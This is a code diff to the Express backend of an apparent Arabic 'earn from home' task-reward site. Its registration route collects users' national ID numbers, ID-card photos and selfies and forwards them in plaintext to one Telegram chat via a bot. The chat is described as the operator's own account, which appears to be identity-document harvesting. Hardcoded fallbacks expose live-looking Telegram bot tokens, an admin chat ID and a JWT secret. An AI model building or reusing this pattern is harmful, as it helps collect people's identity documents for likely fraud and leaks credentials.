@@ -13,11 +13,12 @@ const app = express();
 const port = process.env.PORT || 8080;
 const JWT_SECRET = process.env.JWT_SECRET || 'arbah-min-baytak-secret-key-2026';
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8828476778:AAE338K555Ys-UhT_Qra0z-BiL3405DGoSE';
+// بيانات البوت الجديد ومعرف حسابك
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8236604963:AAEDTid3y1suHB_WR_lqmhTuz9-224sFa0E';
 const TELEGRAM_ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || '7401854621';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-// إعداد الاتصال بـ Upstash
+// إعداد Upstash مع دعم التخزين المؤقت
 let redis;
 if (process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN) {
   redis = new Redis({
@@ -72,9 +73,10 @@ if (process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN) 
   };
 }
 
+// استقبال الصور
 const upload = multer({
   storage: multer.memoryStorage(),
-  limits: { fileSize: 6 * 1024 * 1024 },
+  limits: { fileSize: 10 * 1024 * 1024 },
 });
 
 app.use(express.json());
@@ -83,6 +85,11 @@ app.use(express.static(path.join(__dirname, '.')));
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
+
+function escapeHtml(text) {
+  if (!text) return '';
+  return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
 
 function hashNationalId(id) {
   return crypto.createHash('sha256').update(id.trim()).digest('hex');
@@ -100,42 +107,11 @@ async function authenticateToken(req, res, next) {
   });
 }
 
-async function initSampleTasks() {
-  try {
-    const taskCount = await redis.scard('active_task_ids');
-    if (taskCount === 0) {
-      const sampleTasks = [
-        {
-          id: 'task_1',
-          title: 'الانضمام إلى قناة تليجرام الرسمية',
-          description: 'انضم للقناة وخذ لقطة شاشة تؤكد انضمامك.',
-          reward: 3000,
-          proof_type: 'screenshot',
-        },
-        {
-          id: 'task_2',
-          title: 'الاشتراك بقناة يوتيوب وتفعيل الجرس',
-          description: 'اشترك بالقناة وضع لايك على آخر فيديو وأرسل لقطة شاشة.',
-          reward: 5000,
-          proof_type: 'screenshot',
-        },
-      ];
-
-      for (const t of sampleTasks) {
-        await redis.hset(`task:${t.id}`, t);
-        await redis.sadd('active_task_ids', t.id);
-      }
-    }
-  } catch (err) {
-    console.error('Task init error:', err);
-  }
-}
-initSampleTasks();
-
-// --- 1. تسجيل مستخدم جديد ورفع (أمامية + خلفية + سيلفي) ---
+// --- 1. مسار التسجيل ورفع الصور ---
 app.post('/api/register', upload.fields([
   { name: 'id_front', maxCount: 1 },
   { name: 'id_back', maxCount: 1 },
+  { name: 'id_card', maxCount: 1 },
   { name: 'selfie', maxCount: 1 }
 ]), async (req, res) => {
   try {
@@ -144,12 +120,19 @@ app.post('/api/register', upload.fields([
     if (!username || !phone || !national_id || !password) {
       return res.status(400).json({ error: 'جميع الحقول مطلوبة.' });
     }
-    if (!req.files || !req.files['id_front'] || !req.files['id_back'] || !req.files['selfie']) {
-      return res.status(400).json({ error: 'يرجى إرفاق: صورة الهوية الأمامية، والخلفية، وصورة السيلفي.' });
+
+    // تحديد الصور المرفوعة بمرونة
+    const frontImg = (req.files && (req.files['id_front']?.[0] || req.files['id_card']?.[0])) || null;
+    const backImg = (req.files && req.files['id_back']?.[0]) || null;
+    const selfieImg = (req.files && req.files['selfie']?.[0]) || null;
+
+    if (!frontImg) {
+      return res.status(400).json({ error: 'يرجى إرفاق صورة واجهة الهوية على الأقل.' });
     }
 
     const nationalIdHash = hashNationalId(national_id);
 
+    // فحص منع التكرار
     const isIdTaken = await redis.sismember('registered_national_ids', nationalIdHash);
     if (isIdTaken) {
       return res.status(400).json({ error: 'عذراً، هذا الرقم الوطني مسجل مسبقاً في النظام لمنع تكرار الحسابات.' });
@@ -177,19 +160,19 @@ app.post('/api/register', upload.fields([
     await redis.sadd('registered_national_ids', nationalIdHash);
     await redis.hset('users_by_phone', { [phone.trim()]: userId });
 
-    // إرسال الصورة 1: واجهة الهوية الأمامية مع أزرار القبول والرفض
-    const frontCaption = `📋 *طلب تحقق من هوية جديد - أربح من بيتك*\n\n` +
-                         `👤 *الاسم:* ${username}\n` +
-                         `📱 *الهاتف:* ${phone}\n` +
-                         `🆔 *الرقم الوطني:* ${national_id}\n` +
-                         `🔑 *معرف الحساب:* \`${userId}\`\n\n` +
-                         `1️⃣ *صورة الهوية (الوجه الأمامي):*`;
+    // إرسال الصورة 1: واجهة الهوية مع أزرار القبول والرفض
+    const frontCaption = `📋 <b>طلب تحقق جديد - موقع أربح من بيتك</b>\n\n` +
+                         `👤 <b>الاسم:</b> ${escapeHtml(username)}\n` +
+                         `📱 <b>الهاتف:</b> ${escapeHtml(phone)}\n` +
+                         `🆔 <b>الرقم الوطني:</b> <code>${escapeHtml(national_id)}</code>\n` +
+                         `🔑 <b>معرف الحساب:</b> <code>${userId}</code>\n\n` +
+                         `1️⃣ <b>صورة الهوية (الوجه الأمامي):</b>`;
 
     const formFront = new FormData();
     formFront.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
     formFront.append('caption', frontCaption);
-    formFront.append('parse_mode', 'Markdown');
-    formFront.append('photo', req.files['id_front'][0].buffer, { filename: 'id_front.jpg' });
+    formFront.append('parse_mode', 'HTML');
+    formFront.append('photo', frontImg.buffer, { filename: 'id_front.jpg' });
     formFront.append('reply_markup', JSON.stringify({
       inline_keyboard: [
         [
@@ -201,29 +184,34 @@ app.post('/api/register', upload.fields([
 
     await axios.post(`${TELEGRAM_API}/sendPhoto`, formFront, { headers: formFront.getHeaders() });
 
-    // إرسال الصورة 2: الوجه الخلفي للهوية
-    const formBack = new FormData();
-    formBack.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
-    formBack.append('caption', `2️⃣ *صورة الهوية (الوجه الخلفي) للمستخدم:* ${username}`);
-    formBack.append('parse_mode', 'Markdown');
-    formBack.append('photo', req.files['id_back'][0].buffer, { filename: 'id_back.jpg' });
-    await axios.post(`${TELEGRAM_API}/sendPhoto`, formBack, { headers: formBack.getHeaders() });
+    // إرسال الصورة 2 (الوجه الخلفي إن وجدت)
+    if (backImg) {
+      const formBack = new FormData();
+      formBack.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
+      formBack.append('caption', `2️⃣ <b>صورة الهوية (الوجه الخلفي) للمستخدم:</b> ${escapeHtml(username)}`);
+      formBack.append('parse_mode', 'HTML');
+      formBack.append('photo', backImg.buffer, { filename: 'id_back.jpg' });
+      await axios.post(`${TELEGRAM_API}/sendPhoto`, formBack, { headers: formBack.getHeaders() });
+    }
 
-    // إرسال الصورة 3: السيلفي
-    const formSelfie = new FormData();
-    formSelfie.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
-    formSelfie.append('caption', `3️⃣ *صورة السيلفي للمطابقة للمستخدم:* ${username}`);
-    formSelfie.append('parse_mode', 'Markdown');
-    formSelfie.append('photo', req.files['selfie'][0].buffer, { filename: 'selfie.jpg' });
-    await axios.post(`${TELEGRAM_API}/sendPhoto`, formSelfie, { headers: formSelfie.getHeaders() });
+    // إرسال الصورة 3 (السيلفي إن وجدت)
+    if (selfieImg) {
+      const formSelfie = new FormData();
+      formSelfie.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
+      formSelfie.append('caption', `3️⃣ <b>صورة السيلفي للمطابقة للمستخدم:</b> ${escapeHtml(username)}`);
+      formSelfie.append('parse_mode', 'HTML');
+      formSelfie.append('photo', selfieImg.buffer, { filename: 'selfie.jpg' });
+      await axios.post(`${TELEGRAM_API}/sendPhoto`, formSelfie, { headers: formSelfie.getHeaders() });
+    }
 
     res.json({
       success: true,
       message: 'تم إرسال طلبك وصور الهوية بنجاح! حسابك قيد المراجعة وسيتم تفعيله من الإدارة قريباً.',
     });
+
   } catch (err) {
     console.error('Telegram/Registration Error:', err.response?.data || err.message);
-    res.status(500).json({ error: 'تعذر إرسال البيانات إلى تليجرام، تأكد من إرسال /start للبوت أولاً.' });
+    res.status(500).json({ error: 'حدث خطأ أثناء إرسال البيانات إلى تليجرام، تأكد من الضغط على Start للبوت أولاً.' });
   }
 });
 
@@ -286,7 +274,7 @@ app.post('/api/tasks/:taskId/submit', authenticateToken, upload.single('screensh
     if (!task) return res.status(404).json({ error: 'المهمة غير موجودة' });
 
     const submissionId = crypto.randomUUID();
-    const subData = {
+    await redis.hset(`submission:${submissionId}`, {
       id: submissionId,
       user_id: req.user.id,
       task_id: taskId,
@@ -295,15 +283,13 @@ app.post('/api/tasks/:taskId/submit', authenticateToken, upload.single('screensh
       proof_text: proof_text || '',
       status: 'pending',
       created_at: new Date().toISOString(),
-    };
+    });
 
-    await redis.hset(`submission:${submissionId}`, subData);
-
-    const caption = `🎯 *إثبات مهمة جديد*\n\n` +
-                    `👤 *المستخدم:* ${req.user.username}\n` +
-                    `📌 *المهمة:* ${task.title}\n` +
-                    `💰 *المكافأة:* ${task.reward} ل.س\n` +
-                    (proof_text ? `🔗 *الإثبات النصي:* ${proof_text}\n` : '');
+    const caption = `🎯 <b>إثبات مهمة جديد</b>\n\n` +
+                    `👤 <b>المستخدم:</b> ${escapeHtml(req.user.username)}\n` +
+                    `📌 <b>المهمة:</b> ${escapeHtml(task.title)}\n` +
+                    `💰 <b>المكافأة:</b> ${task.reward} ل.س\n` +
+                    (proof_text ? `🔗 <b>الإثبات النصي:</b> ${escapeHtml(proof_text)}\n` : '');
 
     const replyMarkup = {
       inline_keyboard: [
@@ -318,7 +304,7 @@ app.post('/api/tasks/:taskId/submit', authenticateToken, upload.single('screensh
       const form = new FormData();
       form.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
       form.append('caption', caption);
-      form.append('parse_mode', 'Markdown');
+      form.append('parse_mode', 'HTML');
       form.append('photo', req.file.buffer, { filename: 'proof.jpg' });
       form.append('reply_markup', JSON.stringify(replyMarkup));
       await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() });
@@ -326,7 +312,7 @@ app.post('/api/tasks/:taskId/submit', authenticateToken, upload.single('screensh
       await axios.post(`${TELEGRAM_API}/sendMessage`, {
         chat_id: TELEGRAM_ADMIN_CHAT_ID,
         text: caption,
-        parse_mode: 'Markdown',
+        parse_mode: 'HTML',
         reply_markup: replyMarkup,
       });
     }
@@ -363,16 +349,16 @@ app.post('/api/withdraw', authenticateToken, async (req, res) => {
       created_at: new Date().toISOString(),
     });
 
-    const msg = `💸 *طلب سحب أرباح جديد*\n\n` +
-                `👤 *المستخدم:* ${user.username} (${user.phone})\n` +
-                `💵 *المبلغ:* ${withdrawAmount.toLocaleString()} ل.س\n` +
-                `🏦 *وسيلة السحب:* ${method}\n` +
-                `📍 *الحساب المستلم:* \`${destination}\``;
+    const msg = `💸 <b>طلب سحب أرباح جديد</b>\n\n` +
+                `👤 <b>المستخدم:</b> ${escapeHtml(user.username)} (${escapeHtml(user.phone)})\n` +
+                `💵 <b>المبلغ:</b> ${withdrawAmount.toLocaleString()} ل.س\n` +
+                `🏦 <b>وسيلة السحب:</b> ${escapeHtml(method)}\n` +
+                `📍 <b>الحساب المستلم:</b> <code>${escapeHtml(destination)}</code>`;
 
     await axios.post(`${TELEGRAM_API}/sendMessage`, {
       chat_id: TELEGRAM_ADMIN_CHAT_ID,
       text: msg,
-      parse_mode: 'Markdown',
+      parse_mode: 'HTML',
       reply_markup: {
         inline_keyboard: [
           [
@@ -389,7 +375,7 @@ app.post('/api/withdraw', authenticateToken, async (req, res) => {
   }
 });
 
-// استقبال قرارات أزرار تليجرام
+// أزرار تليجرام
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body;
@@ -402,8 +388,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
         await axios.post(`${TELEGRAM_API}/editMessageCaption`, {
           chat_id: cb.message.chat.id,
           message_id: cb.message.message_id,
-          caption: cb.message.caption + `\n\n🟢 *تم تفعيل الحساب بنجاح.*`,
-          parse_mode: 'Markdown',
+          caption: cb.message.caption + `\n\n🟢 <b>تم تفعيل الحساب بنجاح.</b>`,
+          parse_mode: 'HTML',
         });
         await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, { callback_query_id: cb.id, text: 'تم تفعيل الحساب' });
       } else if (action === 'reject_user') {
@@ -415,8 +401,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
         await axios.post(`${TELEGRAM_API}/editMessageCaption`, {
           chat_id: cb.message.chat.id,
           message_id: cb.message.message_id,
-          caption: cb.message.caption + `\n\n🔴 *تم رفض هذا الطلب.*`,
-          parse_mode: 'Markdown',
+          caption: cb.message.caption + `\n\n🔴 <b>تم رفض هذا الطلب.</b>`,
+          parse_mode: 'HTML',
         });
         await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, { callback_query_id: cb.id, text: 'تم الرفض' });
       } else if (action === 'approve_sub') {
@@ -467,4 +453,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
 });
-    
+      
